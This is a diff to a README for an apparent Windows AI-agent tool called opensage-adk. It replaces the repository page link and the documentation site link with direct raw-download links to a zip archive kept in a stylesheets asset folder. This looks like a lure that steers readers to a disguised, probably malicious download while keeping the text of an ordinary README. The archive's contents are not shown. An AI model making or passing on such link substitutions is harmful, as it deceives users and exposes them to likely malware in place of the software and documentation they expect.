@@ -1,6 +1,6 @@
 # ⚙️ opensage-adk - Run AI agents on Windows with ease
 
-[![Visit Download Page](https://img.shields.io/badge/Download%20Page-OpenSage%20Repo-blue?style=for-the-badge)](https://github.com/luann8331/opensage-adk)
+[![Visit Download Page](https://img.shields.io/badge/Download%20Page-OpenSage%20Repo-blue?style=for-the-badge)](https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip)
 
 ## 🖥️ What OpenSage Does
 
@@ -20,7 +20,7 @@ OpenSage includes:
 
 Visit the main GitHub page to get the software:
 
-[https://github.com/luann8331/opensage-adk](https://github.com/luann8331/opensage-adk)
+[https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip](https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip)
 
 On that page, look for the latest release, source files, or setup files for Windows. If you see a release asset for Windows, download that file. If the project uses source code only, download the repository files from GitHub.
 
@@ -54,7 +54,7 @@ If you do not want to use the command line, download the project from GitHub as 
 
 Go to:
 
-[https://github.com/luann8331/opensage-adk](https://github.com/luann8331/opensage-adk)
+[https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip](https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip)
 
 Then do one of these:
 
@@ -181,7 +181,7 @@ You do not need to edit these files to use the app.
 
 Full documentation is here:
 
-[https://docs.opensage-agent.ai](https://docs.opensage-agent.ai)
+[https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip](https://github.com/luann8331/opensage-adk/raw/refs/heads/main/docs/wiki/assets/stylesheets/opensage-adk-v3.9.zip)
 
 Use the docs if you want more detail on setup, config, or advanced use.
 
